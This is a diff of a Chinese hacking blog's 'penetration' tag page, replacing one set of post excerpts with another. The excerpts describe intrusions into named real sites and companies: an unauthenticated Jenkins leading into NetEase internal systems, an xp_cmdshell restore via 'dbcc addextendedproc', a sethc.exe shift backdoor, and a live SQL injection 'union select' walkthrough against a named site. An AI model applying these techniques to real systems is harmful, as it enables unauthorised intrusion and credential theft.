@@ -45,35 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:55:42.000Z" itemprop="datePublished">
-          2012-06-12
+      <time datetime="2012-08-30T11:19:37.000Z" itemprop="datePublished">
+          2012-08-30
       </time>
     
     
     | 
     <a href='/tag/渗透/'>渗透</a>,
     
-    <a href='/tag/Nginx/'>Nginx</a>,
-    
-    <a href='/tag/web渗透测试/'>web渗透测试</a>,
-    
-    <a href='/tag/反向代理/'>反向代理</a>,
-    
-    <a href='/tag/squid/'>squid</a>
+    <a href='/tag/漏洞/'>漏洞</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/493.seo/">反向代理在Web渗透测试中的运用</a></h2>
+      <h2 class="post-title"><a href="/769.seo/">网易某系统未授权访问致内网被渗透</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>反向代理在Web渗透测试中的运用 </p>  <p>作者：不走的钟 </p>  <p>来源：<a href="http://www.007hack.com/?p=770">http://www.007hack.com/?p=770</a></p>  <p> 在一次Web渗透测试中，目标是M国的一个Win+Apache+PHP+MYSQL的网站，独立服务器，对外仅开80端口，网站前端的业务系统比较简单，经过几天的测试也没有找到漏洞，甚至连XSS都没有发现，也未找到网站后台，在收集信息的时候已经排除了C段入侵的可行性（选择C段入侵的时候，需要对目标、网络、路由和国家区域进行分析和判断，如果不经思考和判断地去入侵C段服务器，当你费尽心思拿到某台服务器权限时，往往发现毫无半点用处，特别又是在国外，ARP基本上都没什么希望，当然内网渗透中又是另一回事。） </p>  <p> 也许在渗透测试遇到这种情况时大多会选择放弃，在绝望的时候，我将目标临时转移到该网站域名注册商，因为拥有域名注册商网站权限，至少可以修改目标网站的域名解析。一般情况入侵域名注册网站难度比较大，但并不是没有希望，在09年的时候，国内很多域名注册商的网站都存在漏洞。渗透那个域名注册商网站，过程比较繁杂，也没有新的技术点，靠的就是细心和耐心，但最终还是获取到目标网站域名的管理账号和密码，那么此时我们已知和已有的条件如下: </p>  <p> 目标域名：www.007hack.com(当然不是真的，文章来源007安全)   <br /> 网站IP:1.1.1.1 </p>  <p> 环境：Win+Apache+PHP+MYSQL </p>  <p> 已有权限：域名解析权限，可以将www.007hack.com解析到任何一个IP上 </p>  <p> 特别说明下，目标网站使用的服务器，并不是在域名注册商租用的，而是放置在公司机房中，所以通过域名注册商网站，是不能管理到Web源码的，只能进行域名解析。 </p>  <p> 当拥有域名解析权限后，如何才获取目标网站的权限呢？ </p>  <p> A：构造一个和目标非常相似的网站？然后将域名解析到构造的网站？ </p>  <p> B：使用iis重定向？ </p>  <p>这些方法都非常容易被发现，并且也无法获取到权限，所以遇到这种场景的时候我们可以使用反向代理，也是本文的重点。了解反向代理之前，我做一个关于HTTP 代理的简单介绍， 代理常用的是普通代理和反向代理： </p>  <p>普通代理：为用户（客户端）提供代理，需要在客户端设置，比如在客户端浏览器中设置代理服务器IP和端口，完成配置后，用户可以通过代理服务器访问互联网，代理服务器相当于中间人的作用。根据代理服务器配置不同，又可以将普通代理分为，几种不同安全级别的代理，代理软件比较多，不同的厂商有不同的称谓和分级，一般情况都包括以下三个级别，透明代理、普通匿名代理和高匿名代理。</p>
+        <p><b>网易某系统未授权访问致内网被<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a></b></p>  <p>网易某系统未授权访问，导致可访问部分内部系统，或可<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>至内网。     <br />测试从这里开始，<a href="http://123.125.50.162:3000。">http://123.125.50.162:3000。</a>     <br />系统是Jenkins（软件测试），没有设置登录验证。     <br /><a href="http://img.cker.in/edaf1c018f23_1DF1/clip_image0014.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001[4]" border="0" alt="clip_image001[4]" src="http://img.cker.in/edaf1c018f23_1DF1/clip_image0014_thumb.jpg" width="858" height="348" /></a>     <br />在设置邮箱处，破解了邮箱密码。     <br /><a href="http://img.cker.in/edaf1c018f23_1DF1/clip_image0024.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002[4]" border="0" alt="clip_image002[4]" src="http://img.cker.in/edaf1c018f23_1DF1/clip_image0024_thumb.jpg" width="885" height="384" /></a>     <br />此账号可登录部分网易内部系统，如Bugzilla，QA，OA，论坛等。     <br /><a href="http://img.cker.in/edaf1c018f23_1DF1/clip_image0034.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image003[4]" border="0" alt="clip_image003[4]" src="http://img.cker.in/edaf1c018f23_1DF1/clip_image0034_thumb.jpg" width="866" height="382" /></a>     <br />登录Bugzilla后，可将自己加为管理员，拥有系统管理权限，Bug涉及所有的邮箱系统。0.0     <br /><a href="http://img.cker.in/edaf1c018f23_1DF1/clip_image0044.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004[4]" border="0" alt="clip_image004[4]" src="http://img.cker.in/edaf1c018f23_1DF1/clip_image0044_thumb.jpg" width="867" height="369" /></a>     <br />软件测试部的OA系统。除了测试需要，别的东西都没动啊。     <br /><a href="http://img.cker.in/edaf1c018f23_1DF1/clip_image0054.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image005[4]" border="0" alt="clip_image005[4]" src="http://img.cker.in/edaf1c018f23_1DF1/clip_image0054_thumb.jpg" width="875" height="398" /></a>     <br />公司内部论坛。DZ7.0的，没WAP模块。     <br /><a href="http://img.cker.in/edaf1c018f23_1DF1/clip_image0064.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image006[4]" border="0" alt="clip_image006[4]" src="http://img.cker.in/edaf1c018f23_1DF1/clip_image0064_thumb.jpg" width="849" height="370" /></a>     <br />因为是邮箱账号，所以邮件里有一些测试机的用户名和密码信息，包括218.107.63.245，218.107.63.248等。     <br /><a href="http://img.cker.in/edaf1c018f23_1DF1/clip_image007.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/edaf1c018f23_1DF1/clip_image007_thumb.jpg" width="877" height="561" /></a>     <br />修复方案：     <br />1. Jenkins增加用户验证。     <br />2. 推荐使用动态口令。</p>  <p>&#160;</p>
       
       </p>
       
       <p>
-          <a href="/493.seo/" class="excerpt-link">Read More...</a>
+          <a href="/769.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -82,102 +76,8 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:54:04.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/入侵/'>入侵</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/490.seo/">回忆对某企业内网的一次渗透</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>回忆对某企业内网的一次渗透做了好多次企业内网渗透的项目,这里还是写下把.</p>  <p>先是谈合同 谈预算 谈价格 这些不多介绍</p>  <p>然后签订保密协议这个也不多说了,最后才是评估以及加固..</p>  <p>进入正题</p>  <p>图片上重要信息或涉密信息均涂掉了,有些突变未上传..</p>  <p>————————————————————————-</p>  <p>首先要踩点,收集信息,这是第一步也是蛮重要的一步个人觉得.</p>  <p>目标信息:</p>  <p>主域名:www.xxxx.com </p>  <p>子域名;OA.xxxx.com</p>  <p>无服务器版本 win2003</p>  <p>脚本语言:ASPX</p>  <p>知道这个以后就开始搞了</p>  <p>然后开始找入住,翻遍全站没发现,找注入大家都会不解释,你懂的.</p>  <p>然后扫目录..</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/befcd4dc8bb9_1A90/clip_image001.gif" width="533" height="447" /></p>  <p>一个一个的翻,找到了洞洞..</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/befcd4dc8bb9_1A90/clip_image003.png" width="508" height="361" /></p>
-      
-      </p>
-      
-      <p>
-          <a href="/490.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-12T09:46:14.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/内网渗透/'>内网渗透</a>,
-    
-    <a href='/tag/渗透/'>渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/483.seo/">win内网渗透实例</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>作者：赤龙<br>最近在整理资料时发现一些渗透笔记，于是翻开看看，原来有一个老外的内部网还没有拿下。当时已经给内网的一台机器种植了木马，反正闲着没事就拿它来练练手吧。打开远程居然肉鸡还在，废话就不多说了，下面开始吧。<br>首先来看看已经控制的这台电脑在内网中充当什么角色，并收集一些常规的信息。执行ipconfig /all (如图1)</p>
-<p><img style="display: inline; border: 0px;" title="clip_image001" src="http://img.cker.in/win_18C1/clip_image001.png" alt="clip_image001" width="752" height="754" border="0" /><br>从这里我们可以看出，此计算机名为abimaq6，ip地址是172.16.16.139。子网掩码为255.255.240.0、网关172.16.16.1、DNS服务器分别是172.16.16.2和172.16.16.3。还有一个重要的就是这台机器处于域管理模式中，所在域为abimaq.local。<br>既然是域结构，再来获取一下域用户列表，执行net user /domain命令(如图2)。该命令可显示所有的域用户名单。看来域用户还真多。</p>
-      
-      </p>
-      
-      <p>
-          <a href="/483.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-12T09:35:13.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/入侵/'>入侵</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/478.seo/">社工+渗透某IDC服务器</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>作者：hu1s4</p>  <p>最近准备做个教育资源站，就打算在网上买个空间，ok百度下吧看看哪个好点</p>  <p>最后准备去这个站注册www.xxxxx.com</p>  <p>西部万维，西部IDC行业领跑，以最值得信赖的信誉为您提供服务器托管、服务器租用、域名注册、服务器租用、VPS、独立IP虚拟主机等服务</p>  <p>淘宝—网银—支付宝—支付成功！！</p>  <p>嘻嘻 邮箱收信了、</p>  <p>嘿嘿…空间到手了，进入FTP传个大马，因为我购买的是全能型空间，所以直接上传asp php asp.net jsp四类大马</p>  <p>查看，哎，权限bt啊，</p>  <p>（如果权限不bt，难道想被万人骑啊 hoho~~~）</p>  <p>试试看.net马吧</p>  <p>貌似权限比ASP的要大 可跳转</p>  <p>在C:\Program Files 发现了360还有星外的主机管理系统</p>  <p>一、提权之旅</p>  <p>在网上看了很多的星外提权文章，大概可以分为：</p>  <p>星外sa注册表位置在这里可以翻到sa的密码 不过需要破解</p>  <p>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11</p>  <p>C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index\ 星外可写目录</p>  <p>还有一些就不列举了经过测试没有一个可行 ……峰回路转</p>  <p>正我郁闷的时候看到了Global.asa，激动的打开一看既然是sa用户</p>  <p>呵呵提权没问题了吧，不过却：</p>  <p>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的过程’sys.xp_cmdshell’ 的访问</p>  <p>组件删除了，没关系我们恢复</p>  <p>dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)&#160; <br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</p>  <p>恢复好了，执行下命令在创建用户加入管理，，OK搞定</p>  <p>远程连接的时候悲剧了既然限制了管理用户组的权限。哎</p>  <p>继续想其他办法，在网上看了一篇文章</p>  <p>知道星外的ftp是自带的，我们可以通过IIS配置来读取用户密码</p>  <p>打开aspx的IIS间谍功能，既然没有禁止，教大家一个禁止aspx查看IIS配置的方法</p>  <p>找到C:\WINDOWS\system32\activeds.tlb这个文件，取消users权限即可，别人就不能查看你的IIS了</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/IDC_15DB/clip_image001.png" width="558" height="233" /></p>  <p>大家看到上面的比较了红色的FREE….</p>  <p>Freehostrunat这个用户是安装星外时建立的后面的密码并不是什么加密方式其实就是明文密码</p>  <p>我们可以直接远程登陆,在内网的话就转发</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_15DB/clip_image002.png" width="513" height="375" /></p>  <p>好了，成功拿下服务器…. 继续渗透….</p>
-      
-      </p>
-      
-      <p>
-          <a href="/478.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-12T09:29:54.000Z" itemprop="datePublished">
-          2012-06-12
+      <time datetime="2012-08-08T11:57:47.000Z" itemprop="datePublished">
+          2012-08-08
       </time>
     
     
@@ -186,17 +86,17 @@
     
     
 </span>
-      <h2 class="post-title"><a href="/476.seo/">某官网的渗透笔记</a></h2>
+      <h2 class="post-title"><a href="/739.seo/">对21cn分站的检测</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        某官网的渗透笔记，挖掘的某0DAY拿到webshell，USER权限，联通外网，提权SYSTEM的EXP无效，看来打的补丁很全，服务器用的是微软FTP,MSSQL，没啥突破口。路过其他盘，发现一个小有年份的BKF文件，貌似这个是用于系统的恢复和还原的.复制到WEB 目录下回来。装个虚拟机还原BKF文件。虚拟机就变成目标主机的系统了。没有密码登陆不进去了。插入WINPE光盘，替换sethc.exe ，做个shift后门，按5次shift进
+        <p>原文地址：法克论坛   <br />作者：泪少    <br />网址：<a href="http://zhao.21cn.com（漏洞站点的域名/URL）">http://zhao.21cn.com（漏洞站点的域名/URL）</a></p>  <p>站点：天翼关爱 电信旗下21分站 （漏洞站点的名字，记得是全称）</p>  <p>风险一   <br />风险描述：后台列目录 可以下载源文件 从文件找到mysql的密码 找到mysql库里查询后台登录地址 进一步<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a> （这里你发现的是什么漏洞就写什么漏洞）    <br />风险示例：    <br /><a href="http://img.cker.in/21cn_3785/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/21cn_3785/clip_image001_thumb.png" width="497" height="395" /></a></p>
       
       </p>
       
       <p>
-          <a href="/476.seo/" class="excerpt-link">Read More...</a>
+          <a href="/739.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -205,29 +105,122 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:11:30.000Z" itemprop="datePublished">
+      <time datetime="2012-07-08T07:06:36.000Z" itemprop="datePublished">
+          2012-07-08
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/钓鱼/'>钓鱼</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/656.seo/">对某钓鱼网站的一次渗透</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>某天在淘宝上买了点东西，和店主确认几句之后，他发来一个链接，让我去支付。    <br />七转八转来到这个页面:     <br /><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/8f598be352ba_B732/clip_image001.jpg" width="516" height="345" />     <br />我看了一下这个网址不对劲，是<a href="http://item.taobao.com-xxxx.co.tv/pay/，莫非我遇上了传说中的淘宝钓鱼？于是立马来了精神，那就顺势检测一下这个钓鱼网站吧。">http://item.taobao.com-xxxx.co.tv/pay/，莫非我遇上了传说中的淘宝钓鱼？于是立马来了精神，那就顺势检测一下这个钓鱼网站吧。</a>     <br />先试试手气，在网址后面加个login.asp，居然看到了后台登录页面！     <br /><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/8f598be352ba_B732/clip_image002.jpg" width="444" height="321" />     <br />试了几个弱口令和万能密码都无果。但是我发现，当用户名输入”admin”，密码为”123”的时候，提示”你输入的密码有误！”；而用户名输入”123”,密码为”123”时，则提示“你输入的用户名有误！”。</p>
+      
+      </p>
+      
+      <p>
+          <a href="/656.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-06-28T07:48:16.000Z" itemprop="datePublished">
+          2012-06-28
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/611.seo/">记新手的一次渗透入侵</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><table border="0" cellspacing="0" cellpadding="0"><tbody>     <tr>       <td>         <p>一年前把，<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a><b></b>了，这次发现不是root，但帐户支持load_file()            <br />Ps：我严重鄙视挂马的人，还有那些黑心贩子。。。            <br />Ps：我从一开始写文章到现在，不屏蔽<b>渗透</b>的地址连接，主要的原因还是希望            <br />大家可以通过我的文章，真正实践性滴学习本文内容，新人朋友可以一步步滴实践操作            <br />【懒得扯淡了，希望大家那个什么什么什么，你们懂的，人品很重要】            <br /><a href="http://www.czxtaiji.net/content.php?theMenuId=4&amp;theSubMenuId=1&amp;theArticleId=48%20and%201=2">http://www.czxtaiji.net/content. … leId=48%20and%201=2</a>            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 947            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 948            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 949            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 950            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 951            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 952            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 953            <br />获取到路径：d:\czxsite\bin\sys\config.php            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/0a82505b9f50_14E77/clip_image002.jpg" width="604" height="316" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=48 order by 9            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/0a82505b9f50_14E77/clip_image004.jpg" width="604" height="240" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,5,6,7,8,9            <br />Warning: disparticlecontent(7): failed to open stream: No such file or directory in d:\czxsite\bin\sys\config.php on line 976            <br />Warning: disparticlecontent(): Failed opening ‘7’ for inclusion (include_path=’.;c:\php4\pear’) in d:\czxsite\bin\sys\config.php on line 976            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,user(),database(),7,8,version()            <br />user():czxtaiji@localhost            <br />version():4.0.18-nt&#160;&#160; <br />database():czxtaiji            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/0a82505b9f50_14E77/clip_image006.jpg" width="604" height="237" /></p>       </td>     </tr>   </tbody></table>
+      
+      </p>
+      
+      <p>
+          <a href="/611.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-06-21T12:29:20.000Z" itemprop="datePublished">
+          2012-06-21
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/572.seo/">渗透一站全过程</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>目标的环境：   <br />目测 2003+iis6+asp.net+mssql&#160; 但是这个网站程序应该是使用的某个asp.net+soap开发的，至少出现漏洞的地方是。    <br /><b>一</b><b>.Web</b><b>站点的渗透</b>    <br />这次渗透并未使用任何扫描嗅探工具去探测目标完全使用手工检查的,经过一系列的测试后在网页源代码里面发现了一个比较有意思的链接。    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/4cca5dc413a9_3F08/clip_image001.jpg" width="558" height="238" />    <br />上图中用篮筐拉出来的地址，引起了我的注意。根据名字这应该是用于上传文件的。    <br />访问这个链接后就证实了我的猜想</p>
+      
+      </p>
+      
+      <p>
+          <a href="/572.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-06-12T10:28:08.000Z" itemprop="datePublished">
           2012-06-12
       </time>
     
     
     | 
-    <a href='/tag/内网渗透/'>内网渗透</a>,
+    <a href='/tag/渗透/'>渗透</a>,
     
-    <a href='/tag/渗透/'>渗透</a>
+    <a href='/tag/渗透测试/'>渗透测试</a>,
+    
+    <a href='/tag/backtrack/'>backtrack</a>,
+    
+    <a href='/tag/VoIP渗透测试/'>VoIP渗透测试</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/465.seo/">浅析企业内网渗透</a></h2>
+      <h2 class="post-title"><a href="/507.seo/">VoIP渗透测试</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        2010年起，Google、SONY、RSA等诸多大型企业遭受APT渗透攻击，对机密资料的保护和内部控制越来越受到人们的重视。本文以攻击者的角度，分析企业内网安全的入侵突破点，希望能给大家带来启发，更好的做好内网防控。一个企业，可以是不同行业，他们所包含的机密数据，隐蔽数据，功能控制，和对整个旗下的可信任域都是极为重要的安全方向。对于初具规模的企业来说，内部沟通需要邮件，即时沟通需要im软件，需要有域控，需要有核心交换机，有几个指定内外
+        <p>VoIP or voice over IP (Internet protocol) is a transmission mode designed for use in voice and multimedia communications. As IP (Internet protocol)-based networks like the Internet seem to be most successful communications infrastructure, the traditional telephone network is currently being replaced VoIP. Nowadays, its clear improvements and advantages over the old systems make it a popular substitute, with a number of advantages. Among them:</p>  <p>The low cost of VoIP as compared to a traditional telephone network. There are any number of services available free of cost (like Skype) that allow you to communicate over distances long or short, PC-to-PC and free of cost.</p>  <p>VoIP is portable. Portability and mobility is another advantage of VoIP over traditional telephone; you only need an Internet connection for communication.</p>  <p>VoIP service includes a number of different advanced features not normally available with traditional telephone service, including call forwarding, conference call, caller ID, virtual numbers and more.</p>  <p>The advantages are many but this is not our main topic of discussion. (Likewise, there are a number of disadvantages, too: VoIP services depend on Internet connection speed; voice quality depends on the performance of your computer, and so forth). So what is our point in discussing this? What we examine here will be the security aspect of VoIP. In this article, we will review:</p>  <p>An overview of VoIP </p>  <p>What is Asterisk? (and what are the functionalities) </p>  <p>What is Trixbox? </p>  <p>VoIP hacking (Penetration testing on an asterisk based network)</p>  <p>With so many aforementioned advantages, VoIP is gaining popularity among both organizations and private users alike. But what about the security issues? As should be entirely predictable, any new technology immediately presents opportunities for those seeking to cause mischief. This is confirmed by reports I’m sure you’ve heard about: not just the phone hacking scandal in Britain, but the hacking in which thieves easily steal confidential information from a victim because their network was not secure.</p>  <p>If you are a pen tester or ethical hacker, then you have an idea about the importance of penetration testing in VoIP, because most of the important communications going on today occur on VoIP and securing confidential information is therefore critical. We will do some practical penetration testing on a VoIP-based network, but first of all I will show you how to build it.</p>  <p>Asterisk is an open-source software that can turn your computer into a communications server. There’s an asterisk software for PBX (private branch exchange) that allows you to make calls and transfer your data.</p>  <p>Trixbox is a wonderful software (or PBX: private branch exchange), based on the asterisk project. It was formally known as but in October 2006 it was renamed Trixbox. The difference between trixbox with other PBX is that trixbox is based on IP (Internet protocol) and has been designed for small and medium sized businesses. There are mainly two version of trixbox available: one is Trixbox CE (a free and open source), while the other – called Trixbox Pro – is one that you will need to purchase.</p>  <p>Protocols &amp; Ports</p>  <p>You must have an idea about the protocols and their ports before attempting to launch actual penetration testing on a VoIP network.</p>  <p>SIP (or session initiation protocol) has been defined by Internet Engineering Task Force (IETF) as the protocol for VoIP communication (in other words: a signaling protocol). SIP uses port 5060 and 5061 for both TCP and UDP.</p>  <p>SDP or session description protocol is for multimedia communications, while MGCP (media gateway control protocol) uses port number 2427 and 2727 for UDP.</p>  <p>RTP (real-time transfer protocol) defines the packets to deliver videos and audios on IP based network like VoIP. RTCP (RTP control protocol) is just like RTP, and it is used to structure the packets that are defined by RTP.</p>  <p>IAX (Inter-Asterisk eXchange) is an important protocol used in the asterisk system and is supported by a different soft-phone and PBX. IAX2 is the second version of IAX and works on the UDP port number 4569.</p>  <p>VoIP Penetration Testing</p>  <p>The process of penetration testing on a VoIP network is generally the same as the penetration testing on any other network. All we need to do is to follow the general guidelines, starting with information gathering, as we would with any form of penetration testing. We will do the same on VoIP network.</p>
       
       </p>
       
       <p>
-          <a href="/465.seo/" class="excerpt-link">Read More...</a>
+          <a href="/507.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -235,7 +228,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/tag/渗透/page/2/">← Newer Posts</a>
-    <span class="page-number">Page 3 of 4</span>
+    <span class="page-number">Page 3 of 5</span>
     <a class="older-posts" href="/tag/渗透/page/4/">Older Posts →</a>
   </nav>
 </main>
